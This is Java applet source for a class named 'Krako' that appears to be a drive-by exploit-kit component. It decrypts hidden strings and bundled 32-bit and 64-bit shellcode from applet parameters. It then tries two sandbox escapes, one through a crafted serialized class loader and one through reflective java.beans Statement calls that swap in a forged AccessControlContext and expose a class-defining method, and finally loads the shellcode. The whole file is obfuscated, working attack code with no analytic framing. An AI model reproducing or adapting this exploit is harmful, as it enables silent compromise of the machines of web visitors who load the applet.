import java.lang.reflect.*;
import java.beans.Expression;
import java.beans.Statement;
import java.applet.Applet;
import java.io.*;
import java.security.*;
import java.math.BigInteger;

@SuppressWarnings("unchecked")
public class Krako extends Applet {
// PAYLOAD_CODE

	B m;

	public Krako() {
	}

	private Class GetClass() throws Throwable {
		Object arrayOfObject[] = new Object[1];
		arrayOfObject[0] = m.ustr[2];
		Class c = Class.forName(m.ustr[6]);
		Class partypes[] = new Class[3];
		partypes[0] = Object.class;
		partypes[1] = String.class;
		partypes[2] = Object[].class;
		Object[] a = new Object[3];
		a[0] = Class.class;
		a[1] = m.ustr[8];
		a[2] = arrayOfObject;
		Constructor con = c.getConstructor(partypes);
		Object inst = con.newInstance(a);
		partypes = new Class[0];
		Method meth = c.getMethod(m.ustr[5], partypes);
		meth.invoke(c.cast(inst), new Object[0]);
		meth = c.getMethod(m.ustr[7], partypes);
		return (Class) meth.invoke(c.cast(inst), new Object[0]);
	}

	private void SetField(Class paramClass, String paramString, Object paramObject1, Object paramObject2)
			throws Throwable {
		Object arrayOfObject[] = new Object[2];
		arrayOfObject[0] = paramClass;
		arrayOfObject[1] = paramString;
		Class c = Class.forName(m.ustr[6]);
		Class partypes[] = new Class[3];
		partypes[0] = Object.class;
		partypes[1] = String.class;
		partypes[2] = Object[].class;
		Object[] a = new Object[3];
		a[0] = GetClass();
		a[1] = m.ustr[3];
		a[2] = arrayOfObject;
		Constructor con = c.getConstructor(partypes);
		Object inst = con.newInstance(a);
		partypes = new Class[0];
		Method meth = c.getMethod(m.ustr[5], partypes);
		meth.invoke(c.cast(inst), new Object[0]);
		meth = c.getMethod(m.ustr[7], partypes);
		((Field) meth.invoke(c.cast(inst), new Object[0])).set(paramObject1, paramObject2);
	}

	MyLoader ml;

	public void init() {
		m = null;
		byte[] ushell32 = null;
		byte[] ushell64 = null;

		try {
			BigInteger key = new BigInteger(getParameter("a"));
			m = new B(key.toByteArray(), Integer.parseInt(getParameter("b")));
			ushell32 = m.uncomp(shellcode32, shellcode32_size);
			ushell64 = m.uncomp(shellcode64, shellcode64_size);
		} catch (Exception e) {
			System.exit(0);
		}

		try {
			Class c = Class.forName(m.ustr[0]);
			ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(m.uas));
			Class partypes[] = new Class[2];
			partypes[0] = int.class;
			Object[] a = (Object[]) ois.readObject();
			partypes[1] = Object.class;
			Object arglist[] = new Object[2];
			arglist[0] = 0;
			arglist[1] = getClass().getClassLoader();
			MyLoader[] ldr = (MyLoader[]) a[1];
			Method meth = c.getMethod(m.ustr[1], partypes);
			meth.invoke(c.cast(a[0]), arglist);
			MyLoader.conFoosedLoad(ldr[0], m, ushell32, ushell64);
		} catch (Exception e) {
			try {
				Class c = Class.forName(m.ustr[4]);
				Class partypes[] = new Class[3];
				partypes[0] = Object.class;
				partypes[1] = String.class;
				partypes[2] = Object[].class;
				Object[] a = new Object[3];
				a[0] = System.class;
				a[1] = m.ustr[9];
				a[2] = new Object[1];
				Constructor con = c.getConstructor(partypes);
				Object inst = con.newInstance(a);
				partypes = new Class[0];
				Method meth = c.getMethod(m.ustr[5], partypes);
				AccessControlContext localAccessControlContext = new AccessControlContext(m.getPDA());
				SetField(c, m.ustr[10], inst, localAccessControlContext);
				meth.invoke(c.cast(inst), new Object[0]);
				c = Class.forName(m.ustr[11]);
				partypes = new Class[5];
				partypes[0] = String.class;
				partypes[1] = byte[].class;
				partypes[2] = int.class;
				partypes[3] = int.class;
				partypes[4] = ProtectionDomain.class;
				meth = c.getDeclaredMethod(m.ustr[12], partypes);
				meth.setAccessible(true);
				MyLoader.conFoosedLoad(getClass().getClassLoader(), meth, m, ushell32, ushell64);
			} catch (Throwable localThrowable) {
				localThrowable.printStackTrace();
			}
		}
	}
}
